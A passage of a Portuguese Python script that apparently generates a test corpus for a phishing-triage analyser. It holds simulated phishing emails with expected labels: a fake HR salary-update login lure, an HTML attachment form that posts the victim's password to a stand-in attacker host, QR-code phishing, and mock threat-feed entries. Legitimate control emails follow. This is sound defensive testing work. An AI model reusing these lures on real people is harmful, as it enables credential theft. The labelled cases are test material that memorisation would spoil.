               ('Subject', assunto('Fatura de Prime Software Solutions (INV2-7K4D-QW2N-88RT-2LZM)')),
               ('Date', data), ('Message-ID', '<1a2b3c4d5e6f.invoice@paypal.com>'), *antispam_exo()],
    corpo=corpo,
    relato='Chegou uma cobrança do PayPal de R$ 1.899 de antivírus Norton, que não assinamos. Tem um 0800 para cancelar. Liguei? Não, achei melhor perguntar.',
    requerente='lucas.ferreira (Comercial)',
    esperado=dict(classificacao='phishing', phishing_type=['Vishing'], delivery_channel='Email',
                  target='User', gravidade='media', mitre=['T1566.004', 'T1656']),
    sinais_obrigatorios=['pagamento', 'urgencia', 'callback-telefone'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=['paypal.com', 'www.paypal.com']),
    reputacao=dict(),
)

# 17 ---------------------------------------------------------------- encaminhado como anexo, imitando o RH (digitou senha)
dom = 'rh-cybersecurity.example'
ip = '203.0.113.230'
data_in = 'Wed, 18 Nov 2026 08:30:12 +0000'
alvo = f'https://portal.{dom}/colaborador/login?next=/reajuste-2027'
interno_htm = f'''<html><body style="font-family:Calibri,Arial;font-size:11pt">
<p>Prezados colaboradores,</p>
<p>Informamos que a tabela de <b>reajuste salarial 2027</b> e a nova política de PLR já estão disponíveis para consulta
individual no Portal do Colaborador.</p>
<p>Acesse com o seu usuário e senha da rede: <a href="{alvo}">Portal do Colaborador - Reajuste 2027</a></p>
<p>A consulta fica disponível até sexta-feira.</p>
<p>Atenciosamente,<br>Recursos Humanos<br>Cybersecurity Ltda</p></body></html>'''
interno_txt = ('Prezados colaboradores,\n\nInformamos que a tabela de reajuste salarial 2027 e a nova política de PLR já '
               'estão disponíveis para consulta individual no Portal do Colaborador.\n\nAcesse com o seu usuário e senha '
               f'da rede: {alvo}\n\nA consulta fica disponível até sexta-feira.\n\nAtenciosamente,\nRecursos Humanos\n')
rec, rec_ext = received_exo(f'mail.{dom}', ip, data_in)
interno = alternativo(interno_txt, interno_htm, '_000_RH2027_')
interno_bruto = montar(rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'none', 'none'), rec_ext,
                              ('From', nome_codificado('RH - Cybersecurity', f'comunicados@{dom}')),
                              ('To', f'joao.lima@{ORG}'), ('Subject', assunto('Reajuste salarial 2027 e PLR - consulta individual')),
                              ('Date', data_in), ('Message-ID', f'<rh2027.0830@{dom}>'), *antispam_exo()], interno)
fora = MIMEMultipart('mixed')
fora.set_boundary('_002_CP8PR80MB4932FWD_')
fora.attach(texto('Recebi isso, parece do RH mas o endereço é diferente.\n\nJoão\n'))
parte_msg = MIMEMessage(message_from_string(interno_bruto.decode('utf-8')))
parte_msg.add_header('Content-Disposition', 'attachment', filename='Reajuste salarial 2027 e PLR.eml')
fora.attach(parte_msg)
data = 'Wed, 18 Nov 2026 09:02:40 +0000'
caso(
    id='17-encaminhado-rh-falso-senha',
    titulo='Encaminhado como anexo: "RH" falso com reajuste salarial; o usuário digitou a senha',
    tecnica=('Imitação de área interna (RH) com domínio parecido com o da empresa e isca de reajuste/PLR. O usuário '
             'encaminhou como anexo (o jeito certo): o analisador tem que olhar a mensagem DE DENTRO.'),
    cabecalhos=[('Received', f'from {EXO} (2603:10d6:103:12c::9) by {EXO} with HTTPS; {data}'),
                ('From', nome_codificado('João Lima', f'joao.lima@{ORG}')), ('To', f'seguranca@{ORG}'),
                ('Subject', assunto('ENC: Reajuste salarial 2027 e PLR - consulta individual')), ('Date', data),
                ('Message-ID', f'<CP8PR80MB4932FWD0902@{EXO}>'),
                ('X-MS-Exchange-Organization-AuthAs', 'Internal')],
    corpo=fora,
    relato=('Abri o portal do reajuste e coloquei meu usuário e senha da rede, a página deu erro. Depois vi que o endereço '
            'não é o nosso. Estou mandando o e-mail em anexo.'),
    requerente='joao.lima (RH)',
    esperado=dict(classificacao='phishing', phishing_type=['Credential Harvesting'], delivery_channel='Email',
                  target='HR', gravidade='critica', mitre=['T1566.002', 'T1656']),
    sinais_obrigatorios=['imita-organizacao', 'credenciais', 'relato-pagina-falsa'],
    bloqueio=dict(deve_ter=[dom], nao_pode_ter=[ORG]),
    reputacao=dict(rdap={dom: 4}),
)

# 18 ---------------------------------------------------------------- anexo HTML com tela de login local
dom = 'faturamento-digital.example'
coleta = 'coleta-acesso.example'
ip = '203.0.113.77'
data = 'Thu, 19 Nov 2026 15:22:08 +0000'
rec, rec_ext = received_exo(f'mail.{dom}', ip, data)
pagina = f'''<!DOCTYPE html>
<html lang="pt-br"><head><meta charset="utf-8"><title>Visualizar documento</title>
<style>body{{font-family:Segoe UI,Arial;background:#f2f2f2}}.c{{width:360px;margin:80px auto;background:#fff;padding:28px}}</style></head>
<body><div class="c"><h3>Documento protegido</h3><p>Para visualizar a fatura, confirme a sua conta corporativa.</p>
<form method="POST" action="https://{coleta}/doc/recebe.php">
<input type="email" name="u" value="lucas.ferreira@{ORG}" readonly><br>
<input type="password" name="p" placeholder="Senha"><br>
<button type="submit">Visualizar</button></form>
<p style="font-size:11px;color:#888">Documento de teste do corpus do analisador-phishing-glpi.</p></div></body></html>'''.encode('utf-8')
txt = ('Prezado(a),\n\nSegue a fatura nº 20261119-0832 em anexo. O documento é protegido: abra o arquivo e confirme a '
       'sua conta para visualizar.\n\nFaturamento Digital\n')
corpo = MIMEMultipart('mixed')
corpo.set_boundary('----=_Part_88231_1763565728')
corpo.attach(texto(txt))
corpo.attach(anexo(pagina, 'text/html', 'Fatura_20261119-0832.html'))
caso(
    id='18-html-login-local',
    titulo='Credenciais: anexo .html com tela de login que envia a senha para o atacante',
    tecnica=('Página de login dentro do próprio anexo (não há link no corpo): o formulário já vem com o e-mail da vítima '
             'e manda a senha por POST para o servidor do atacante. Escapa de filtros que só olham links.'),
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'none', 'none'), rec_ext,
               ('From', nome_codificado('Faturamento Digital', f'nfe@{dom}')),
               ('To', f'lucas.ferreira@{ORG}'), ('Subject', assunto('Fatura 20261119-0832 disponível')),
               ('Date', data), ('Message-ID', f'<88231.1763565728@{dom}>'), *antispam_exo()],
    corpo=corpo,
    relato='Abri o anexo da fatura e ele pediu a minha senha, mas eu não digitei. Não conheço essa empresa.',
    requerente='lucas.ferreira (Comercial)',
    esperado=dict(classificacao='phishing', phishing_type=['Credential Harvesting'], delivery_channel='Email',
                  target='User', gravidade='alta', mitre=['T1566.001', 'T1056.003']),
    sinais_obrigatorios=['anexo-perigoso', 'html-login-local'],
    bloqueio=dict(deve_ter=[dom, coleta], nao_pode_ter=[ORG]),
    reputacao=dict(rdap={dom: 12}),
    ioc_escondido=coleta,
)

# 19 ---------------------------------------------------------------- quishing: QR Code dentro de um PDF anexo
dom = 'assinatura-eletronica-docs.example'
destino = 'assina-docs-seguro.example'
ip = '203.0.113.141'
data = 'Fri, 20 Nov 2026 09:12:44 +0000'
rec, rec_ext = received_exo(f'mail.{dom}', ip, data)
destino_qr = f'https://{destino}/s/?d=8841'
txt = ('Prezado(a),\n\nVocê tem um documento aguardando assinatura: Contrato de Prestação de Serviços 2027.\n\n'
       'Por segurança, o link de assinatura só abre no celular: abra o PDF anexo e escaneie o QR Code com a câmera.\n'
       'O documento expira em 24 horas.\n\nAssinatura Eletrônica Docs\n')
corpo = MIMEMultipart('mixed')
corpo.set_boundary('----=_Part_8841_1763629964')
corpo.attach(texto(txt))
corpo.attach(anexo(pdf_com_qr(['Contrato de Prestacao de Servicos 2027', 'Escaneie o QR Code abaixo com o celular para assinar.',
                               'Documento de teste do corpus do analisador-phishing-glpi'], destino_qr),
                   'application/pdf', 'Contrato_Prestacao_Servicos_2027.pdf'))
caso(
    id='19-quishing-qr-no-pdf',
    titulo='Quishing: QR Code dentro de um PDF anexo ("assine pelo celular")',
    tecnica=('O link fica só dentro de um QR Code desenhado num PDF anexo: o corpo não tem link e o filtro de anexos vê um '
             'PDF comum. "Só abre no celular" tira o acesso do computador protegido (proxy, EDR).'),
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'none', 'none'), rec_ext,
               ('From', nome_codificado('Assinatura Eletrônica Docs', f'documentos@{dom}')),
               ('To', f'ana.ribeiro@{ORG}'), ('Subject', assunto('Documento aguardando sua assinatura')),
               ('Date', data), ('Message-ID', f'<8841.1763629964@{dom}>'), *antispam_exo()],
    corpo=corpo,
    relato='Chegou um contrato para assinar com QR Code no PDF. Não escaneei, não esperava contrato nenhum.',
    requerente='ana.ribeiro (Financeiro)',
    esperado=dict(classificacao='phishing', phishing_type=['QR', 'Credential Harvesting'], delivery_channel='Email',
                  target='Finance', gravidade='media', mitre=['T1566.001', 'T1566.002']),
    sinais_obrigatorios=['qrcode', 'qrcode-decodificado'],
    bloqueio=dict(deve_ter=[dom, destino], nao_pode_ter=[ORG]),
    reputacao=dict(rdap={dom: 6, destino: 3}),
    ioc_escondido=destino,
    qr={'Contrato_Prestacao_Servicos_2027.pdf': [destino_qr]},
)

# 20 ---------------------------------------------------------------- quishing: QR "desenhado" com tabela HTML
dom = 'conta-seguranca-online.example'
destino = 'verifica-acesso-m365.example'
ip = '198.51.100.188'
data = 'Fri, 20 Nov 2026 14:40:02 +0000'
rec, rec_ext = received_exo(f'mail.{dom}', ip, data)
destino_qr = f'https://{destino}/v/?id=55120'
htm = f'''<html><body style="font-family:Segoe UI,Arial;font-size:14px">
<p><b>Verificação de segurança obrigatória</b></p>
<p>Detectamos um acesso incomum à sua conta. Para manter o acesso ao e-mail, escaneie o código abaixo com o celular
e confirme a sua identidade em até 12 horas.</p>
{qr_tabela_html(destino_qr)}
<p style="font-size:11px;color:#777">Equipe de Segurança de Contas</p></body></html>'''
txt = ('Verificação de segurança obrigatória\n\nDetectamos um acesso incomum à sua conta. Para manter o acesso ao e-mail, '
       'escaneie o código com o celular e confirme a sua identidade em até 12 horas.\n\nEquipe de Segurança de Contas\n')
corpo = alternativo(txt, htm, '_000_QRTABELA55120_')
caso(
    id='20-quishing-qr-tabela-html',
    titulo='Quishing: QR Code "desenhado" com tabela HTML (sem imagem)',
    tecnica=('O QR Code é montado com centenas de células de tabela pretas e brancas: não há imagem para o filtro ler. '
             'Técnica vista em kits de 2024-2025 para fugir de leitores de QR em imagem.'),
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'none', 'none'), rec_ext,
               ('From', nome_codificado('Segurança da Conta', f'alerta@{dom}')),
               ('To', f'lucas.ferreira@{ORG}'), ('Subject', assunto('Ação necessária: verificação de segurança')),
               ('Date', data), ('Message-ID', f'<55120.qr@{dom}>'), *antispam_exo()],
    corpo=corpo,
    relato='Recebi pedido de verificação de segurança com um código para escanear. Não escaneei.',
    requerente='lucas.ferreira (Comercial)',
    esperado=dict(classificacao='phishing', phishing_type=['QR', 'Credential Harvesting'], delivery_channel='Email',
                  target='User', gravidade='media', mitre=['T1566.002', 'T1027']),
    sinais_obrigatorios=['qrcode-desenhado', 'qrcode-decodificado'],
    bloqueio=dict(deve_ter=[dom, destino], nao_pode_ter=[ORG]),
    reputacao=dict(rdap={dom: 9, destino: 2}),
    ioc_escondido=destino,
    qr={'qr-desenhado-1.pgm': [destino_qr]},
)

# ================================================================ FEEDS DE IOC (OpenPhish / ThreatFox)
# Casos em que SÓ o feed denuncia: e-mail bem escrito, conta autenticada, VirusTotal sem nada (campanha nova).
# O conteúdo simulado dos feeds é gravado em feeds.json (FEED_OPENPHISH / FEED_THREATFOX, montados abaixo) e o
# avaliador passa esse conteúdo pelo MESMO nó que carrega o Redis ("Prepara os IOCs dos feeds").
FEED_OPENPHISH = []
FEED_THREATFOX = []


def threatfox(ioc, tipo, ameaca, malware, confianca=75, comprometido=False, dia='2026-11-19'):
    FEED_THREATFOX.append({'id': str(900000 + len(FEED_THREATFOX)), 'ioc': ioc, 'threat_type': ameaca, 'ioc_type': tipo,
                           'malware_printable': malware, 'confidence_level': confianca, 'is_compromised': comprometido,
                           'first_seen': f'{dia} 10:00:00 UTC', 'last_seen': None, 'tags': []})


# Ruído realista (o feed traz muito mais do que interessa a um chamado): nada disso aparece nos e-mails do conjunto.
FEED_OPENPHISH += [
    'https://secure-bancoverde-acesso.example/login/',
    'http://entrega-pendente-rastreio.example/taxa?c=88120',
    'https://golpe-netflix-pagamento.pages.dev/conta',
    'https://www.lojinhadobairro.example/wp-content/uploads/2026/11/m365/index.php',
]
threatfox('c2-painel-loader.example', 'domain', 'botnet_cc', 'AsyncRAT')
threatfox('203.0.113.200:4443', 'ip:port', 'botnet_cc', 'Remcos')
threatfox('http://198.51.100.250/bins/x86', 'url', 'payload_delivery', 'Mirai')
threatfox('a' * 64, 'sha256_hash', 'payload', 'Lumma Stealer')
# Serviço compartilhado no feed: NUNCA pode marcar o host inteiro (só a URL exata).
threatfox('https://github.com/usuario-qualquer-77/loader/releases/download/v1/setup.zip', 'url', 'payload_delivery', 'Vidar')
threatfox('github.com', 'domain', 'payload_delivery', 'Vidar')
# Relato com pouca confiança sobre um fornecedor legítimo do conjunto: abaixo do mínimo (50), tem de ser ignorado.
threatfox('graficapaulista.example', 'domain', 'payload_delivery', 'desconhecido', confianca=25)

# 21 ---------------------------------------------------------------- conta de fornecedor invadida + link no OpenPhish
dom = 'construtoravale.example'
ip = '198.51.100.120'
data = 'Thu, 19 Nov 2026 15:22:10 +0000'
rec, rec_ext = received_exo(f'mail.{dom}', ip, data)
alvo = 'https://docs-proposta-online.example/visualizar/9f3a2c7e'
# Mesmo kit, outra vítima (token diferente): o host inteiro é do atacante.
FEED_OPENPHISH.append('https://docs-proposta-online.example/visualizar/41bd07aa')
htm = f'''<html><body style="font-family:Calibri,Arial;font-size:11pt">
<p>Boa tarde, Ana,</p><p>Conforme conversamos, segue a proposta revisada para a reforma do 3º andar.</p>
<p><a href="{alvo}">Proposta_Revisada_Reforma.pdf</a></p>
<p>Fico no aguardo.</p><p>Att.,<br>Marcos Teixeira<br>Construtora Vale</p></body></html>'''
txt = (f'Boa tarde, Ana,\n\nConforme conversamos, segue a proposta revisada para a reforma do 3º andar.\n\n'
       f'Proposta_Revisada_Reforma.pdf: {alvo}\n\nFico no aguardo.\n\nAtt.,\nMarcos Teixeira\nConstrutora Vale\n')
corpo = alternativo(txt, htm, '_000_CV9f3a2c7e_')
caso(
    id='21-fornecedor-invadido-link-no-feed',
    titulo='Conta de fornecedor invadida: proposta com link para página que o OpenPhish já conhece (outra vítima)',
    tecnica=('Campanha nova a partir de conta legítima invadida: e-mail autenticado, sem marca imitada, sem urgência e o '
             'VirusTotal ainda não conhece o link. Só o feed denuncia: o mesmo host já aparece no OpenPhish com outro token.'),
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'pass', 'pass'), rec_ext, dkim_assinatura(dom),
               ('From', nome_codificado('Marcos Teixeira', f'marcos.teixeira@{dom}')),
               ('To', f'ana.ribeiro@{ORG}'), ('Subject', assunto('RE: Proposta revisada - reforma 3º andar')),
               ('Date', data), ('Message-ID', f'<CV9f3a2c7e.1763565730@{dom}>'), *antispam_exo()],
    corpo=corpo,
    relato='A construtora mandou link de proposta, mas a reforma já foi fechada no mês passado. Achei estranho, não abri.',
    requerente='ana.ribeiro (Compras)',
    esperado=dict(classificacao='phishing', phishing_type=['Credential Harvesting'], delivery_channel='Email',
                  target='Finance', gravidade='media', mitre=['T1566.002']),
    sinais_obrigatorios=['feed-host', 'autenticado'],
    bloqueio=dict(deve_ter=['docs-proposta-online.example'], nao_pode_ter=[ORG]),
    reputacao=dict(rdap={dom: 4380, 'docs-proposta-online.example': 400}),
)

# 22 ---------------------------------------------------------------- anexo com hash no ThreatFox
dom = 'contabilidade-moraes.example'
ip = '192.0.2.88'
data = 'Thu, 19 Nov 2026 17:40:02 +0000'
rec, rec_ext = received_exo(f'smtp.{dom}', ip, data)
z = zip_fixo([('Guia_DARF_Novembro.pdf', pdf_minimo(['Guia DARF - teste do corpus', 'arquivo inofensivo'])),
              ('LEIA-ME.txt', LEIA_ME)])
threatfox(hashlib.sha256(z).hexdigest(), 'sha256_hash', 'payload', 'Grandoreiro')
txt = ('Prezados,\n\nSegue a guia do DARF de novembro para pagamento. Vencimento dia 20.\n\nAtenciosamente,\n'
       'Departamento Fiscal\nContabilidade Moraes\n')
corpo = MIMEMultipart('mixed')
corpo.set_boundary('----=_Part_DARF_1763574002')
corpo.attach(texto(txt))
corpo.attach(anexo(z, 'application/zip', 'Guia_DARF_Novembro.zip'))
caso(
    id='22-anexo-hash-no-threatfox',
    titulo='Malware: .zip da "contabilidade" cujo hash já está no ThreatFox',
    tecnica=('Entrega de malware por conta de escritório de contabilidade (domínio antigo, autenticado). O .zip parece '
             'inofensivo por dentro; só o hash denuncia, porque já foi relatado como carga de trojan bancário.'),
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'pass', 'pass'), rec_ext, dkim_assinatura(dom),
               ('From', nome_codificado('Contabilidade Moraes - Fiscal', f'fiscal@{dom}')),
               ('To', f'maria.souza@{ORG}'), ('Subject', assunto('Guia DARF - novembro')),
               ('Date', data), ('Message-ID', f'<darf.1763574002@{dom}>'), *antispam_exo()],
    corpo=corpo,
    relato='A contabilidade mandou o DARF em zip. Normalmente vem em PDF. Não abri.',
    requerente='maria.souza (Financeiro)',
    esperado=dict(classificacao='phishing', phishing_type=['Malware Delivery'], delivery_channel='Email',
                  target='Finance', gravidade='media', mitre=['T1566.001']),
    sinais_obrigatorios=['feed-hash', 'anexo-compactado'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=[ORG]),
    reputacao=dict(rdap={dom: 3650}),
)

# 23 ---------------------------------------------------------------- URL exata no OpenPhish, em serviço compartilhado
dom = 'eventos-associacao.example'
ip = '203.0.113.140'
data = 'Fri, 20 Nov 2026 09:05:44 +0000'
rec, rec_ext = received_exo(f'mail.{dom}', ip, data)
pagina = 'https://storage.googleapis.com/arquivos-compartilhados-7731/visualizar.html'
alvo = f'{pagina}#maria.souza@{ORG}'
FEED_OPENPHISH.append(pagina)
htm = f'''<html><body style="font-family:Arial;font-size:14px">
<p>Olá,</p><p>Os certificados do Encontro Regional de Gestores já estão disponíveis.</p>
<p><a href="{alvo}">Baixar certificado</a></p><p>Associação de Gestores</p></body></html>'''
txt = f'Olá,\n\nOs certificados do Encontro Regional de Gestores já estão disponíveis.\n\nBaixar certificado: {alvo}\n\nAssociação de Gestores\n'
corpo = alternativo(txt, htm, '----=_Part_cert_7731')
caso(
    id='23-url-exata-no-feed-em-servico-compartilhado',
    titulo='Página falsa no Google Cloud Storage: a URL exata está no OpenPhish (o host é de todo mundo)',
    tecnica=('Página de login hospedada em bucket público (storage.googleapis.com), com o e-mail da vítima no #. O host é '
             'compartilhado e não pode ser marcado inteiro; a URL exata (sem o #) está no feed.'),
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'pass', 'pass'), rec_ext, dkim_assinatura(dom),
               ('From', nome_codificado('Associação de Gestores', f'certificados@{dom}')),
               ('To', f'maria.souza@{ORG}'), ('Subject', assunto('Seu certificado está disponível')),
               ('Date', data), ('Message-ID', f'<cert7731.1763629544@{dom}>'), *antispam_exo()],
    corpo=corpo,
    relato='Não participei de encontro nenhum. Chegou link de certificado. Não cliquei.',
    requerente='maria.souza (Financeiro)',
    esperado=dict(classificacao='phishing', phishing_type=['Credential Harvesting'], delivery_channel='Email',
                  target='User', gravidade='media', mitre=['T1566.002']),
    sinais_obrigatorios=['feed-url'],
    sinais_proibidos=['feed-host'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=['storage.googleapis.com', 'googleapis.com', ORG]),
    reputacao=dict(rdap={dom: 900}),
)

# ================================================================ LEGÍTIMOS (controle de falso positivo)

# L1 ---------------------------------------------------------------- alerta real da Microsoft
ip = '40.107.236.84'
data = 'Thu, 19 Nov 2026 10:21:05 +0000'
rec, rec_ext = received_exo('NAM10-MW2-obe.outbound.protection.outlook.com', ip, data, frontend='CP2PEPF0000012D')
htm = '''<html><body style="font-family:Segoe UI,Arial;font-size:14px;color:#2a2a2a">
<p style="font-size:20px;color:#2672ec">Conta Microsoft</p>
<p style="font-size:30px;color:#2672ec">Atividade de entrada incomum</p>
<p>Detectamos uma atividade de entrada incomum na conta Microsoft pe*****@cybersecurity.local.</p>
<p>Detalhes de entrada<br>País/região: Portugal<br>Endereço IP: 2.xx.xx.140<br>Data: 19/11/2026 07:14 (GMT)<br>
Plataforma: Windows<br>Navegador: Edge</p>
<p>Se foi você, pode ignorar este email com segurança.</p>
<p>Se não foi você, sua conta pode ter sido comprometida. Siga as próximas etapas:</p>
<p><a href="https://account.live.com/Activity">Revisar atividade recente</a></p>
<p>Para cancelar a assinatura ou alterar para onde você recebe notificações de segurança,
<a href="https://account.live.com/SecurityNotifications/Update">clique aqui</a>.</p>
<p>Obrigado,<br>Equipe de contas da Microsoft</p></body></html>'''
txt = ('Conta Microsoft\nAtividade de entrada incomum\n\nDetectamos uma atividade de entrada incomum na conta Microsoft '
       'pe*****@cybersecurity.local.\n\nPaís/região: Portugal\n\nSe foi você, pode ignorar este email com segurança.\n'
       'Se não foi você, sua conta pode ter sido comprometida.\n\nRevisar atividade recente: https://account.live.com/Activity\n')
corpo = alternativo(txt, htm, '----=_Part_MSA_441207')
caso(
    id='L1-microsoft-alerta-verdadeiro',
    titulo='LEGÍTIMO: alerta verdadeiro de entrada incomum da Microsoft (o usuário estava em viagem)',
    tecnica='Controle de falso positivo: texto parecido com phishing ("atividade incomum"), mas remetente e links oficiais.',
    cabecalhos=rec + [*autenticacao_exo(ip, 'accountprotection.microsoft.com', 'accountprotection.microsoft.com', 'pass', 'pass', 'pass'),
               rec_ext, dkim_assinatura('accountprotection.microsoft.com', 'selector1'),
               ('From', nome_codificado('Equipe de contas da Microsoft', 'account-security-noreply@accountprotection.microsoft.com')),
               ('To', f'pedro.alves@{ORG}'), ('Subject', assunto('Atividade de entrada incomum na conta Microsoft')),
               ('Date', data), ('Message-ID', '<RQZ7XKD1F2U4.441207@CY4PEPF0000E2E1.namprd05.prod.outlook.com>'),
               *antispam_exo()],
    corpo=corpo,
    relato='Recebi alerta de login em Portugal. Eu estou em Lisboa a trabalho essa semana. É verdadeiro? Não cliquei.',
    requerente='pedro.alves (TI)',
    esperado=dict(classificacao='legitimo', phishing_type=[], delivery_channel='Email', target='User', gravidade='baixa', mitre=[]),
    sinais_obrigatorios=['autenticado'],
    sinais_proibidos=['marca', 'marca-link', 'link-disfarcado', 'dmarc', 'reply-to'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=['account.live.com', 'live.com', 'microsoft.com', 'accountprotection.microsoft.com']),
    reputacao=dict(),
)

# L2 ---------------------------------------------------------------- DocuSign verdadeiro
ip = '64.207.219.13'
data = 'Thu, 19 Nov 2026 15:44:12 +0000'
rec, rec_ext = received_exo('mailch1.docusign.net', ip, data)
alvo = 'https://na4.docusign.net/Signing/EmailStart.aspx?a=3f1c7a2e-8b4d-4c11-9e5f-0a2b4c6d8e10&etti=24&acct=6e1f2a3b-4c5d-4e6f-8a9b-0c1d2e3f4a5b&er=7d8e9f0a-1b2c-4d3e-8f4a-5b6c7d8e9f0a'
htm = f'''<html><body style="font-family:Helvetica,Arial;background:#eaeaea">
<table align="center" width="640" style="background:#fff;padding:24px"><tr><td>
<p><img src="https://na4.docusign.net/Member/Images/email/docusign-logo.png" alt="DocuSign" width="116"></p>
<div style="background:#1e4ca1;color:#fff;padding:28px;text-align:center">
<p>Grupo Alvorada enviou um documento para você revisar e assinar.</p>
<a href="{alvo}" style="background:#ffc423;color:#333;padding:12px 28px;text-decoration:none">REVISAR DOCUMENTO</a></div>
<p><b>Fernanda Alvorada</b><br><a href="mailto:fernanda@grupo-alvorada.example">fernanda@grupo-alvorada.example</a></p>
<p>Ana, segue o contrato de fornecimento 2027 para assinatura, conforme reunião de ontem.</p>
<p style="font-size:11px;color:#666">Não compartilhe este e-mail. Este e-mail contém um link seguro para o DocuSign.
Não compartilhe este e-mail, link ou código de acesso com outras pessoas.<br>
Sobre o DocuSign: assine documentos eletronicamente em apenas minutos.</p></td></tr></table></body></html>'''
txt = (f'Grupo Alvorada enviou um documento para você revisar e assinar.\n\nREVISAR DOCUMENTO: {alvo}\n\n'
       'Fernanda Alvorada\nfernanda@grupo-alvorada.example\n\nAna, segue o contrato de fornecimento 2027 para assinatura, '
       'conforme reunião de ontem.\n')
corpo = alternativo(txt, htm, '----=_NextPart_DocuSign_3f1c7a2e')
caso(
    id='L2-docusign-verdadeiro',
    titulo='LEGÍTIMO: envelope verdadeiro do DocuSign (contrato esperado pela usuária)',
    tecnica='Controle de falso positivo: plataforma de assinatura legítima, link oficial docusign.net.',
    cabecalhos=rec + [*autenticacao_exo(ip, 'docusign.net', 'docusign.net', 'pass', 'pass', 'pass'), rec_ext,
               dkim_assinatura('docusign.net', 'mail'),
               ('From', nome_codificado('Fernanda Alvorada via DocuSign', 'dse_NA4@docusign.net')),
               ('Reply-To', nome_codificado('Fernanda Alvorada', 'fernanda@grupo-alvorada.example')),
               ('To', f'ana.ribeiro@{ORG}'), ('Subject', assunto('Complete com DocuSign: Contrato_Fornecimento_2027.pdf')),
               ('Date', data), ('Message-ID', '<3f1c7a2e8b4d4c119e5f0a2b4c6d8e10@docusign.net>'), *antispam_exo()],
    corpo=corpo,
    relato='Estou esperando o contrato do Grupo Alvorada pelo DocuSign. Pode confirmar se esse é seguro antes de eu assinar?',
    requerente='ana.ribeiro (Compras)',
    esperado=dict(classificacao='legitimo', phishing_type=[], delivery_channel='Email', target='User', gravidade='baixa', mitre=[]),
    sinais_obrigatorios=['autenticado'],
    sinais_proibidos=['marca', 'marca-link', 'link-disfarcado', 'dmarc'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=['docusign.net', 'na4.docusign.net']),
    reputacao=dict(),
    nota=('O Reply-To para o domínio do cliente (grupo-alvorada.example) é normal no DocuSign e gera o sinal "reply-to" '
          '(+15); o caso confere se isso sozinho não derruba a classificação.'),
)

# L3 ---------------------------------------------------------------- SharePoint verdadeiro de parceiro (esperado)
ip = '40.107.215.71'
data = 'Fri, 20 Nov 2026 11:30:44 +0000'
rec, rec_ext = received_exo('SEYPR02CU002.outbound.protection.outlook.com', ip, data, frontend='CP2PEPF0000012B')
alvo = ('https://contabilmartins-my.sharepoint.com/:x:/g/personal/paulo_contabilmartins_onmicrosoft_com/'
        'EcT9q1rWm2jAo5lQ1tU0v4dC9xZk3LrY6v8As2Eg7hIoMx?e=Xw7pRt')
htm = f'''<html><body style="font-family:Segoe UI,Arial;font-size:14px">
<p style="font-size:21px">Paulo Martins compartilhou um arquivo com você</p>
<p style="color:#605e5c">Segue o balancete de outubro, como pedido.</p>
<table style="border:1px solid #edebe9;padding:12px;width:480px"><tr><td><b>Balancete_Outubro_2026.xlsx</b></td></tr></table><br>
<a href="{alvo}" style="background:#0078d4;color:#fff;padding:8px 20px;text-decoration:none">Abrir</a>
<p style="font-size:11px;color:#a19f9d">Microsoft Corporation, One Microsoft Way, Redmond, WA 98052</p></body></html>'''
txt = f'Paulo Martins compartilhou um arquivo com você\n\nSegue o balancete de outubro, como pedido.\n\nBalancete_Outubro_2026.xlsx\nAbrir: {alvo}\n'
corpo = alternativo(txt, htm, '_000_SEYPR02MB7311A1B2_')
caso(
    id='L3-sharepoint-parceiro-esperado',
    titulo='LEGÍTIMO: compartilhamento verdadeiro do SharePoint pelo contador (arquivo pedido pela usuária)',
    tecnica='Controle de falso positivo e par do caso 07: mesmo formato de e-mail, mas o arquivo era esperado.',
    cabecalhos=rec + [*autenticacao_exo(ip, 'sharepointonline.com', 'sharepointonline.com', 'pass', 'pass', 'pass',
                                        dkim_d='sharepointonline.com'), rec_ext,
               dkim_assinatura('sharepointonline.com', 'selector1-sharepointonline-com'),
               ('From', nome_codificado('Paulo Martins (via SharePoint Online)', 'no-reply@sharepointonline.com')),
               ('Reply-To', 'paulo@contabilmartins.example'),
               ('To', f'maria.souza@{ORG}'),
               ('Subject', assunto('Paulo Martins compartilhou "Balancete_Outubro_2026.xlsx" com você')),
               ('Date', data), ('Message-ID', '<9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d@SEYPR02MB7311.apcprd02.prod.outlook.com>'),
               *antispam_exo()],
    corpo=corpo,
    relato='O nosso contador Paulo mandou o balancete pelo SharePoint, eu tinha pedido ontem. Só quero confirmar se é seguro.',
    requerente='maria.souza (Financeiro)',
    esperado=dict(classificacao='legitimo', phishing_type=[], delivery_channel='Email', target='Finance', gravidade='baixa', mitre=[]),
    sinais_obrigatorios=['autenticado'],
    sinais_proibidos=['marca', 'link-disfarcado', 'dmarc'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=['sharepoint.com', 'sharepointonline.com', 'contabilmartins-my.sharepoint.com']),
    reputacao=dict(),
)

# L4 ---------------------------------------------------------------- comunicado interno real da TI
data = 'Fri, 20 Nov 2026 12:00:00 +0000'
htm = '''<html><body style="font-family:Calibri,Arial;font-size:11pt">
<p>Olá, Lucas,</p>
<p>A sua senha da rede expira em <b>5 dias</b> (25/11/2026). Para trocar, pressione <b>Ctrl+Alt+Del</b> no computador da
empresa e escolha "Alterar uma senha", ou use o portal interno https://senha.cybersecurity.local quando estiver na VPN.</p>
<p>A TI nunca pede a sua senha por e-mail, telefone ou mensagem.</p>
<p>Central de Serviços de TI - ramal 4000</p></body></html>'''
txt = ('Olá, Lucas,\n\nA sua senha da rede expira em 5 dias (25/11/2026). Para trocar, pressione Ctrl+Alt+Del no computador '
       'da empresa e escolha "Alterar uma senha", ou use o portal interno https://senha.cybersecurity.local quando estiver '
       'na VPN.\n\nA TI nunca pede a sua senha por e-mail, telefone ou mensagem.\n\nCentral de Serviços de TI - ramal 4000\n')
corpo = alternativo(txt, htm, '_000_CP8PR80MB4932SENHA_')
caso(
